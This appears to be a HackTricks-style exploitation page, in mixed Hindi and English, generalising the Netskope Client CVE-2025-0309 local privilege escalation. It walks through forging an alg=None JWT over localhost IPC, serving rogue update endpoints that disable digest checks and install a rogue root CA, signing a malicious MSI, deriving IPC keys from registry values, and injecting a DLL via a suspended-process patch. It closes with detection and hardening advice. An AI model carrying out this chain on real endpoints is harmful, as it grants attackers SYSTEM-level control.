# एंटरप्राइज ऑटो-अपडेटर्स और प्रिविलेज्ड IPC का दुरुपयोग (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन विंडोज़ लोकल privilege escalation चेन का सामान्यीकरण करता है जो एंटरप्राइज endpoint agents और updaters में पाए जाते हैं और जो एक कम-रुकावट वाली localhost IPC सतह और एक प्रिविलेज्ड अपडेट फ्लो को एक्सपोज़ करते हैं। एक प्रतिनिधि उदाहरण Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक कम-प्रिविलेज उपयोगकर्ता enrollment को एक attacker‑controlled सर्वर की ओर मजबूर कर सकता है और फिर एक malicious MSI भेज सकता है जिसे SYSTEM सेवा इंस्टॉल कर देती है।

मुख्य विचार जो आप समान उत्पादों के खिलाफ पुन: उपयोग कर सकते हैं:
- एक प्रिविलेज्ड सेवा के localhost IPC का दुरुपयोग करके पुनः-नियोजन या पुन: कॉन्फ़िगरेशन को एक attacker सर्वर की ओर मजबूर करें।
- वेंडर के update endpoints को इम्प्लीमेंट करें, एक rogue Trusted Root CA डिलीवर करें, और updater को एक malicious, “signed” package की ओर इंगित करें।
- कमजोर signer checks (CN allow‑lists), optional digest flags, और ढीली MSI properties से बचें।
- यदि IPC “encrypted” है, तो registry में संग्रहित world‑readable machine identifiers से key/IV निकालेँ।
- यदि सेवा callers को image path/process name द्वारा प्रतिबंधित करती है, तो किसी allow‑listed process में inject करें या एक suspended process spawn करें और minimal thread‑context patch के जरिए अपनी DLL bootstrap करें।

---
## 1) localhost IPC के जरिए attacker सर्वर की ओर enrollment मजबूर करना

कई agents एक user‑mode UI process के साथ आते हैं जो localhost TCP पर JSON का उपयोग करके SYSTEM सेवा से बात करती है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) एक JWT enrollment token बनाएं जिनके claims backend host (उदा., AddonUrl) को नियंत्रित करते हों। alg=None का उपयोग करें ताकि किसी signature की आवश्यकता न हो।
2) provisioning कमांड को invoke करते हुए अपना JWT और tenant name के साथ IPC message भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सेवा आपके rogue server पर enrollment/config के लिए हिट करना शुरू कर देती है, उदाहरण के लिए:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट:
- यदि caller verification path/name‑based है, तो अनुरोध allow‑listed vendor binary से originate करें (देखें §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

एक बार client आपके server से बात करे, तो अपेक्षित endpoints को implement करें और इसे attacker MSI की ओर steer करें। सामान्य अनुक्रम:

1) /v2/config/org/clientconfig → JSON config लौटाएँ जिसमें updater interval बहुत छोटा हो, उदा.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: service केवल यह जाँचना कर सकता है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA उस CN के साथ एक leaf जारी कर सकता है और MSI पर साइन कर सकता है।
- CERT_DIGEST property: एक benign MSI property जिसका नाम CERT_DIGEST है शामिल करें। इंस्टॉल के समय कोई प्रवर्तन नहीं होता।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) अतिरिक्त cryptographic validation को अक्षम कर देता है।

Result: SYSTEM सर्विस आपके MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से इंस्टॉल कर देती है, और arbitrary code NT AUTHORITY\SYSTEM के रूप में execute होता है।

---
## 3) Forging encrypted IPC requests (when present)

R127 से, Netskope ने IPC JSON को encryptData फील्ड में लपेटा जो Base64 जैसा दिखता था। रिवर्सिंग से पता चला कि AES key/IV registry मानों से व्युत्पन्न थे जिन्हें किसी भी user द्वारा पढ़ा जा सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers उस encryption को reproduce कर सकते हैं और एक standard user से वैध encrypted commands भेज सकते हैं। सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करता है, तो HKLM के तहत device IDs, product GUIDs, install IDs जैसे मटेरियल की तलाश करें।

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

कुछ services peer को authenticate करने के लिए TCP connection का PID resolve करते हैं और image path/name की तुलना Program Files के तहत स्थित allow‑listed vendor binaries (e.g., stagentui.exe, bwansvc.exe, epdlp.exe) के साथ करते हैं।

Two practical bypasses:
- एक allow‑listed process (e.g., nsdiag.exe) में DLL injection और उसके अंदर से IPC को proxy करना।
- एक allow‑listed binary को suspended स्थिति में spawn करें और CreateRemoteThread का उपयोग किए बिना अपना proxy DLL bootstrap करें (see §5) ताकि driver‑enforced tamper नियमों को संतुष्ट किया जा सके।

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products अक्सर एक minifilter/OB callbacks driver (e.g., Stadrv) के साथ भेजे जाते हैं जो protected processes के handles से खतरनाक अधिकार हटा देते हैं:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

एक विश्वसनीय user‑mode loader जो इन सीमाओं का सम्मान करता है:
1) CreateProcess के साथ vendor binary को CREATE_SUSPENDED में बनाएँ।
2) उन handles को प्राप्त करें जिनका उपयोग अभी भी आपको करने की अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और एक thread handle THREAD_GET_CONTEXT/THREAD_SET_CONTEXT के साथ (या यदि आप किसी ज्ञात RIP पर कोड patch करते हैं तो केवल THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed‑mapped thunk) को एक छोटा सा stub से overwrite करें जो आपके DLL path पर LoadLibraryW को कॉल करता है, फिर वापस jump करता है।
4) ResumeThread करके आपके stub को इन‑प्रोसेस ट्रिगर करें, और आपका DLL लोड होगा।

क्योंकि आपने पहले से‑protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे बनाया), ड्राइवर की नीति संतुष्ट रहती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) एक rogue CA, malicious MSI signing को automate करता है, और आवश्यक endpoints सर्व करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।
- UpSkope एक custom IPC client है जो arbitrary (optionally AES‑encrypted) IPC messages बनाता है और suspended‑process injection शामिल करता है ताकि यह allow‑listed binary से originate करे।

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root में additions की निगरानी करें। Sysmon + registry‑mod eventing (see SpecterOps guidance) प्रभावी हैं।
- Agent की service द्वारा paths जैसे C:\ProgramData\<vendor>\<agent>\data\*.msi से शुरू की गई MSI executions को flag करें।
- अनपेक्षित enrollment hosts/tenants के लिए agent logs की समीक्षा करें, जैसे: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant anomalies और provisioning msg 148 देखें।
- उन localhost IPC clients पर alert करें जो अपेक्षित signed binaries नहीं हैं, या जो असामान्य child process trees से originate होते हैं।

---
## Hardening tips for vendors
- Enrollment/update hosts को एक सख्त allow‑list पर बांधें; clientcode में untrusted domains को reject करें।
- Image path/name checks की बजाय IPC peers को OS primitives (ALPC security, named‑pipe SIDs) से authenticate करें।
- Secret material को world‑readable HKLM से बाहर रखें; अगर IPC को encrypted होना ही है, तो keys को protected secrets से derive करें या authenticated channels पर negotiate करें।
- Updater को supply‑chain surface के रूप में मानें: अपने नियंत्रण में एक trusted CA तक पूरी chain आवश्यक करें, package signatures को pinned keys के खिलाफ verify करें, और यदि validation config में disabled है तो fail closed करें।

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
